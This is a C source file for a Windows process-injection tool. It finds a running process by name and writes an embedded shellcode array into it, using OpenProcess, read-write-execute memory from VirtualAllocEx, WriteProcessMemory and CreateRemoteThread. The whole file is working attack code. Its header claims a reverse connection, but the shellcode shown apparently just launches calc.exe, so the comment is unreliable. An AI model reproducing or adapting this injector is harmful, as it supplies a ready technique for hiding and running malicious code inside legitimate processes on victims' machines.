/*
    Inject payload to an existed process on target machine by it's name and then execute the payload to establish a reverse connection
*/

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char payload[] =
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
    "\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
    "\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
    "\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
    "\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
    "\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
    "\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
    "\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
    "\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
    "\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
    "\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
    "\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
    "\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
    "\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

unsigned int payload_len = sizeof(payload);

int FindProccessIDbyName(const char *proc_name)
{
    HANDLE hSnapshot;  // Snapshot handle
    PROCESSENTRY32 pe; // Process entry
    int pid = 0;
    bool hResult;

    // Create snapshot of all process
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        CloseHandle(hSnapshot);
        return 0;
    }

    pe.dwSize = sizeof(PROCESSENTRY32);

    // Get first process info, then move to the next in a loop
    hResult = Process32First(hSnapshot, &pe);
    while (hResult)
    {
        if (strcmp(proc_name, (const char *)pe.szExeFile) == 0)
        {
            pid = pe.th32ProcessID;
            break;
        }

        hResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

int main(int argc, char *argv[])
{
    HANDLE ph; // Process handle
    HANDLE th; // Remote thread handle
    PVOID rb;  // Remote buffer
    int pid = 0;

    // Check input param
    if (argc != 2)
    {
        printf("Usage: %s <process name>\n", argv[0]);
        printf("Example: %s calc.exe\n", argv[0]);
        exit(0);
    }

    // Get process ID from it's name
    pid = FindProccessIDbyName(argv[1]);
    if (pid == 0)
    {
        printf("Invalid process! Please try again");
        exit(0);
    }

    // Open target process by input ID
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);

    // Allocate memory buffer for target process
    rb = VirtualAllocEx(ph, NULL, payload_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

    // Copy payload to target process's new buffer
    WriteProcessMemory(ph, rb, payload, payload_len, NULL);

    // Create a remote thread running under target process
    th = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
    CloseHandle(ph);
    CloseHandle(th);

    return 0;
}